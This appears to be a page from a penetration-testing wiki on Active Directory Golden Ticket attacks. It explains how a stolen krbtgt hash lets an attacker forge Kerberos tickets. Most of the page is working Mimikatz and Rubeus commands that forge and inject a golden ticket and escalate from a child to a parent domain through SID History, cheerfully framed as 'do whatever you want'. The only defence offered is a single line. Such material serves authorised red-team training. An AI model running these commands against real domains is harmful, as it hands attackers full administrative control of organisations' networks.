---
layout: default
title: Golden Tickets
parent: Active Directory
nav_order: 7
permalink: /ad/golden/
---

# Golden Tickets
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

Kerberos authentication protocol involves an Active Directory Key Distribution Service which uses a service account named `krbtgt`. If you manage to retrieve the password hash of this service account, you would be able to create Keberos TGT with highest privileges possible on the targeted domain with Path the Hash method.

{: .important }
> Since `krbtgt` password is by default configured to **never change**.

## Prerequisites

* Having the password hash of `krbtgt` domain user.
* Having the targeted domain SID.

## Exploit

```bash
# With Mimikatz, purge tickets in your current session.
kerberos::purge

# Forge the golden ticket for your user.
kerberos::golden /user:$username /domain:$domain /sid:$domain_sid /krbtgt:$hash /ptt

# You can also use Rubeus to generate the golden ticket and import it in a dummy session.
.\Rubeus.exe golden /aes256:$hash /user:$username /domain:$domain /sid:$sid /nowrap
.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:$domain /username:$username /password:$whatever /ticket:$Base64EncodedTicket
```

Your user is now in the most privileged group in the Active Directory, including Domain Admins. You can do whatever you want, enjoy!

{: .warning }
> If you want to connect remotely to a machine, **use the hostname, not the IP.** Golden Tickets attack consists in leveraging Kerberos authentication by performing [Overpass The Hash](/ad/overpassthehash/). If you specify the IP of the target, you’ll force NTLM authentication, which will fail.

In the case where you are Domain Admin in a child domain, you can become Domain Admin in the parent domain using SID History. This attack is also possible for [Diamond Tickets](/ad/diamond/)

```powershell
# Get trust information.
Get-DomainTrust

# Get the SID of Domain Admin group.
$DomainAdminSID = Get-DomainGroup -Identity "Domain Admins" -Domain $ParentDomain -Properties ObjectSid

# Forge the golden ticket 
.\Rubeus.exe golden /aes256:$hash /user:$username /domain:$ChildDomain /sid:$sid /sids:$DomainAdminSID /nowrap
```

{: .important }
> Note that in the case you are facing 3 domains with transitive relationships (A -> B -> C), if you are Domain Admin in domain C, you can leverage SID History to directly escalate your privileges in domain A.

## Recommendations

- [ ] Nothing to do here, simply don't disclose `krbtgt` hash.